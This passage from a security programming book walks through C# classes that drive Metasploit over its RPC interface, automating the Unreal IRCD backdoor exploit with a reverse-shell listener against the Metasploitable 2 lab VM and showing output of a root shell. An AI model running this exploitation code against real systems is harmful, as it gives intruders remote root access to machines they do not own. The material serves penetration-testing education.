</span><span class="calibre4"><span class="italic">class to get version information from the RPC interface</span></span></p><p class="calibre_6">This small test program expects a single argument: the IP address for the Metasploit host. The first thing we do is assign the first argument to the <span class="calibre4">listenAddr</span> variable ➊, which is used to create a new <span class="calibre4">MetasploitSession</span> ➋. Once authenticated, we call the <span class="calibre4">core.version</span> RPC method ➌ to display the Metasploit ➍, Ruby ➎, and API ➏ versions in use, the output of which is shown in <a href="#filepos796859">Listing 11-10</a>.</p><blockquote class="calibre_14"><span class="calibre4">$ </span><span class="calibre4"><span class="bold">./ch11_automating_metasploit.exe 192.168.0.2</span></span><br class="calibre5"/><span class="calibre4">Version: 4.11.8-dev-a030179</span><br class="calibre5"/><span class="calibre4">Ruby: 2.1.6 x86_64-darwin14.0 2015-04-13</span><br class="calibre5"/><span class="calibre4">API: 1.0</span></blockquote><p id="filepos796859" class="calibre_15"><span class="calibre4"><span class="italic">Listing 11-10: Running the</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">MetasploitSession</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">test prints the API, Ruby, and Metasploit version information</span></span></p><p id="filepos797141" class="calibre_10"><span class="calibre3"><span class="bold">Writing the MetasploitManager Class</span></span></p><p class="calibre_11">The <span class="calibre4">MetasploitManager</span> class shown in <a href="#filepos800376">Listing 11-11</a> wraps some basic functionality that we will need in order to drive exploitation programmatically via the RPC, including the ability to list sessions, read session shells, and execute modules.</p><blockquote class="calibre_14"><span class="calibre4"> public class MetasploitManager : IDisposable</span><br class="calibre5"/><span class="calibre4">{</span><br class="calibre5"/><span class="calibre4"> private MetasploitSession _session;</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> public MetasploitManager(➊MetasploitSession session)</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> _session = session;</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> public Dictionary&lt;object, object&gt; ➋ListJobs()</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> return _session.Execute("job.list");</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> public Dictionary&lt;object, object&gt; StopJob(string jobID)</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> return _session.Execute("job.stop", jobID);</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> public Dictionary&lt;object, object&gt; ➌ExecuteModule(string moduleType, string moduleName,</span><br class="calibre5"/><span class="calibre4"> Dictionary&lt;object, object&gt; options)</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> return _session.Execute("module.execute", moduleType, moduleName, options);</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> public Dictionary&lt;object, object&gt; ListSessions()</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> return _session.Execute("session.list");</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> public Dictionary&lt;object, object&gt; StopSession(string sessionID)</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> return _session.Execute("session.stop", sessionID);</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> public Dictionary&lt;object, object&gt; ➍ReadSessionShell(string sessionID, int? readPointer = null)</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> if (readPointer.HasValue)</span><br class="calibre5"/><span class="calibre4"> return _session.Execute("session.shell_read", sessionID, readPointer.Value);</span><br class="calibre5"/><span class="calibre4"> else</span><br class="calibre5"/><span class="calibre4"> return _session.Execute("session.shell_read", sessionID);</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> public Dictionary&lt;object, object&gt; ➎WriteToSessionShell(string sessionID, string data)</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> return _session.Execute("session.shell_write", sessionID, data);</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> public void Dispose()</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> _session = null;</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><span class="calibre4">}</span></blockquote><p id="filepos800376" class="calibre_15"><span class="calibre4"><span class="italic">Listing 11-11: The</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">MetasploitManager</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">class</span></span></p><p class="calibre_6"> The <span class="calibre4">MetasploitManager</span> constructor takes a <span class="calibre4">MetasploitSession</span> ➊ as its only argument and then assigns the session argument to a local class variable. The rest of the methods in the class simply wrap a specific RPC method that we’ll use to automate the exploitation of Metasploitable 2. For example, we use the <span class="calibre4">ListJobs()</span> method ➋ to monitor our exploit so we know when the exploit is finished and we can run a command on the shelled machine.</p><p class="calibre_6">We use the <span class="calibre4">ReadSessionShell()</span> method ➍ to read any output resulting from running a command with the session. The <span class="calibre4">WriteToSessionShell()</span> method ➎, conversely, writes any commands to the shell to be executed. The <span class="calibre4">ExecuteModule()</span> method ➌ takes a module to execute and the options to use when executing the module. Each method uses <span class="calibre4">Execute()</span> to execute a given RPC method and return the results to the caller. We’ll discuss each method as we make the finishing touches to drive Metasploit in the next sections.</p><p id="filepos801804" class="calibre_10"><span class="calibre3"><span class="bold">Putting It All Together</span></span></p><p class="calibre_11">Now we can use our classes to begin automating exploitation via Metasploit. First, let’s write a <span class="calibre4">Main()</span> method to listen for a connect-back shell and then run an exploit that causes Metasploitable to connect back to our listener with a new session (see <a href="#filepos803743">Listing 11-12</a>).</p><blockquote class="calibre_14"><span class="calibre4">public static void Main(string[] args)</span><br class="calibre5"/><span class="calibre4">{</span><br class="calibre5"/><span class="calibre4"> ➊string listenAddr = args[1];</span><br class="calibre5"/><span class="calibre4"> int listenPort = 4444;</span><br class="calibre5"/><span class="calibre4"> string payload = "cmd/unix/reverse";</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> using (➋MetasploitSession session = new MetasploitSession("username",</span><br class="calibre5"/><span class="calibre4"> "password", "http://"+listenAddr+":55553/api"))</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> if (string.IsNullOrEmpty(session.➌Token))</span><br class="calibre5"/><span class="calibre4"> throw new Exception("Login failed. Check credentials");</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> using (MetasploitManager manager = new ➍MetasploitManager(session))</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> Dictionary&lt;object, object&gt; response = null;</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> ➎Dictionary&lt;object, object&gt; opts = new Dictionary&lt;object, object&gt;();</span><br class="calibre5"/><span class="calibre4"> opts["ExitOnSession"] = false;</span><br class="calibre5"/><span class="calibre4"> opts["PAYLOAD"] = payload;</span><br class="calibre5"/><span class="calibre4"> opts["LHOST"] = listenAddr;</span><br class="calibre5"/><span class="calibre4"> opts["LPORT"] = listenPort;</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> response = manager.➏ExecuteModule("exploit", "multi/handler", opts);</span><br class="calibre5"/><span class="calibre4"> object jobID = response["job_id"]; </span><a id="filepos803743"/><span class="calibre4"><span class="italic">Listing 11-12: The beginning of the</span></span><span class="calibre4">
</span><span class="calibre7"><span class="italic">Main()</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">method for automating the</span></span><span class="calibre4">
</span><span class="calibre7"><span class="italic">MetasploitSession</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">and</span></span><span class="calibre4">
</span><span class="calibre7"><span class="italic">MetasploitManager</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">classes</span></span></blockquote><p class="calibre_6"> Next, we define a few variables for later use ➊: the address and port for Metasploit to listen on for a connection back and the payload to be sent to Metasploitable. Then, we create a new <span class="calibre4">MetasploitSession</span> class ➋ and check the session <span class="calibre4">Token</span> property ➌ to confirm authentication. Once we know that we are authenticated, we pass the session to a new <span class="calibre4">MetasploitManager</span> ➍ so that we can begin exploitation.</p><p class="calibre_6">At ➎, we create a dictionary to hold the options to send to Metasploit when we begin listening for a connect-back, namely <span class="calibre4">ExitOnSession</span>, <span class="calibre4">PAYLOAD</span>, <span class="calibre4">LHOST</span>, and <span class="calibre4">LPORT</span>. The <span class="calibre4">ExitOnSession</span> option is a Boolean value that dictates whether the listener will stop when a session connects. If this value is <span class="calibre4">true</span>, the listener will stop. If it’s <span class="calibre4">false</span>, the listener will continue to listen for new shells. The <span class="calibre4">PAYLOAD</span> option is a string that tells Metasploit what kind of connect-back payload the listener should expect. <span class="calibre4">LPORT</span> and <span class="calibre4">LHOST</span> are the port and the IP address to listen on, respectively. We pass these options to the <span class="calibre4">multi/handler</span> exploit module (which listens for a connect-back shell from Metasploitable) using the <span class="calibre4">ExecuteModule()</span> ➏, which starts a job to listen for the connect-back shell. The job ID is returned by <span class="calibre4">ExecuteModule()</span> and stored for later use.</p><p id="filepos805936" class="calibre_10"><span class="calibre3"><span class="italic"><span class="bold">Running the Exploit</span></span></span></p><p class="calibre_11"><a href="#filepos806741">Listing 11-13</a> shows how to add the code to run the actual exploit against Metasploitable.</p><blockquote class="calibre_14"><span class="calibre4"> opts = new Dictionary&lt;object, object&gt;();</span><br class="calibre5"/><span class="calibre4"> opts["RHOST"] = args[0];</span><br class="calibre5"/><span class="calibre4"> opts["DisablePayloadHandler"] = true;</span><br class="calibre5"/><span class="calibre4"> opts["LHOST"] = listenAddr;</span><br class="calibre5"/><span class="calibre4"> opts["LPORT"] = listenPort;</span><br class="calibre5"/><span class="calibre4"> opts["PAYLOAD"] = payload;</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> manager.➊ExecuteModule("exploit", "unix/irc/unreal_ircd_3281_backdoor", opts); </span><a id="filepos806741"/><span class="calibre4"><span class="italic">Listing 11-13: Running the Unreal IRCD exploit via the RPC</span></span></blockquote><p class="calibre_6">As we did earlier, we set up the module datastore options in a dictionary before calling <span class="calibre4">ExecuteModule()</span> ➊ and passing it the <span class="calibre4">unix/irc/unreal_ircd_ 3281_backdoor</span> exploit module name and options (see <a href="#filepos807772">Listing 11-14</a>).</p><blockquote class="calibre_14"><span class="calibre4"> response = manager.➊ListJobs();</span><br class="calibre5"/><span class="calibre4"> while (response.➋ContainsValue("Exploit: unix/irc/unreal_ircd_3281_backdoor"))</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> Console.WriteLine("Waiting");</span><br class="calibre5"/><span class="calibre4"> System.Threading.Thread.Sleep(10000);</span><br class="calibre5"/><span class="calibre4"> response = manager.➌ListJobs();</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> response = manager.➍StopJob(jobID.ToString());</span><br class="calibre5"/></blockquote><p id="filepos807772" class="calibre_15"><span class="calibre4"><span class="italic">Listing 11-14: Watching until the Unreal IRC exploit is finished running</span></span></p><p class="calibre_6"> The <span class="calibre4">ListJobs()</span> method ➊ returns a list of all jobs currently running on the Metasploit instance as a list of strings with the module name in them. If the list contains the name of the module we are running, our exploit hasn’t finished, so we need to wait a bit and recheck until our module is no longer listed. If <span class="calibre4">ContainsValue()</span> ➋ returns true, then our module is still running, so we sleep and call <span class="calibre4">ListJobs()</span> ➌ again until the exploit module is no longer listed in the jobs, which means it has finished running. Now we should have a shell. Finally, we turn off the <span class="calibre4">multi/handler</span> exploit module with <span class="calibre4">StopJob()</span> ➍ by passing it the job ID we stored earlier.</p><p id="filepos808744" class="calibre_10"><span class="calibre3"><span class="italic"><span class="bold">Interacting with the Shell</span></span></span></p><p class="calibre_11">We should now be able to interact with the new shell. To test the connection, we run a simple command to confirm we have the access we want, as shown in <a href="#filepos809980">Listing 11-15</a>.</p><blockquote class="calibre_14"><span class="calibre4"> response = manager.➊ListSessions();</span><br class="calibre5"/><span class="calibre4"> foreach (var pair in response)</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> string sessionID = pair.Key.ToString();</span><br class="calibre5"/><span class="calibre4"> manager.➋WriteToSessionShell(sessionID, "id\n");</span><br class="calibre5"/><span class="calibre4"> System.Threading.Thread.Sleep(1000);</span><br class="calibre5"/><span class="calibre4"> response = manager.➌ReadSessionShell(sessionID);</span><br class="calibre5"/><span class="calibre4"> Console.WriteLine("We are user: " + response ["data"]);</span><br class="calibre5"/><span class="calibre4"> Console.WriteLine("Killing session: " + sessionID);</span><br class="calibre5"/><span class="calibre4"> manager.➍StopSession(sessionID);</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><span class="calibre4">}</span></blockquote><p id="filepos809980" class="calibre_15"><span class="calibre4"><span class="italic">Listing 11-15: Retrieving the list of the current sessions and printing the results</span></span></p><p class="calibre_6">At ➊, we call <span class="calibre4">ListSessions()</span>, which returns a list of the session IDs and general information about the sessions, such as session type. As we iterate over each session (there should only be one, unless you run the exploit multiple times!), we use the <span class="calibre4">WriteToSessionShell()</span> method ➋ to write the <span class="calibre4">id</span> command to the session shell, then sleep for a bit, and read the response using <span class="calibre4">ReadSessionShell()</span> ➌. Finally, we write the results of running <span class="calibre4">id</span> on the compromised system and then kill the session with <span class="calibre4">StopSession()</span> ➍.</p><p id="filepos810842" class="calibre_10"><span class="calibre3"><span class="italic"><span class="bold">Popping Shells</span></span></span></p><p class="calibre_11">Now we can run the automation and pop some easy shells. The program must be run with two arguments: the host to exploit and the IP address Metasploit should listen on for shells, as <a href="#filepos811737">Listing 11-16</a> shows.</p><blockquote class="calibre_14"><span class="calibre4">$ </span><span class="calibre4"><span class="bold">./ch11_automating_metasploit.exe 192.168.0.18 192.168.0.2</span></span><br class="calibre5"/><span class="calibre4">Waiting</span><br class="calibre5"/><span class="calibre4">Waiting</span><br class="calibre5"/><span class="calibre4">Waiting</span><br class="calibre5"/><span class="calibre4">Waiting</span><br class="calibre5"/><span class="calibre4"> Waiting</span><br class="calibre5"/><span class="calibre4">We are user: ➊uid=0(root) gid=0(root)</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4">Killing session: 3</span><br class="calibre5"/><span class="calibre4">$</span></blockquote><p id="filepos811737" class="calibre_15"><span class="calibre4"><span class="italic">Listing 11-16: Running the Unreal IRC exploit automation, showing we have a root shell</span></span></p><p class="calibre_6">If everything has worked correctly, we should now have a root shell ➊, and we can run some post-exploitation modules against Metasploitable using C# automation, or perhaps just spin off a few backup shells in case this one goes dark. The <span class="calibre4">post/linux/gather/enum_configs</span> module is a common post-exploit module for Linux. You could update your automation to run this or any of the <span class="calibre4">post/linux/gather/enum_*</span> modules after popping the initial shell on Metasploitable.</p><p class="calibre_6">This is just the beginning of the very cool things you can drive the Meta sploit Framework to do, from discovery to exploitation. As mentioned earlier, Metasploit even has a place in post-exploitation with many modules for several operating systems. You can also drive discovery using the auxiliary scanner modules in <span class="italic">auxiliary/scanner/*</span>. A neat exercise would be to take the cross-platform Metasploit payload we wrote in <a href="index_split_009.html#filepos344540">Chapter 4</a> and dynamically generate shellcode via the RPC and create dynamic payloads.</p><p id="filepos813040" class="calibre_10"><span class="calibre3"><span class="bold">Conclusion</span></span></p><p class="calibre_11">In this chapter, you learned how to create a small set of classes to programmatically drive Metasploit via the RPC interface. Using basic HTTP libraries and a third-party MSGPACK library, we were able to exploit the Metasploitable 2 virtual machine with the Unreal IRCD backdoor and then run a command on the shelled machine to prove we had a root shell.</p><p class="calibre_6">We have only touched on the power of the Metasploit RPC in this chapter. I highly encourage you to dig deeper into the potential of building Metasploit into change management or software development life cycle processes in your corporate environments to ensure misconfigurations or vulnerable software is not reintroduced to a data center or network with automatic scanning. At home, you can easily automate new device discovery with the Nmap integration that Metasploit ships with to find any new phones or gadgets your kids may not have told you about. The possibilities are limitless when it comes to the flexibility and power of the Metasploit Framework.</p><div class="mbp_pagebreak" id="calibre_pb_16"/>
</body></html>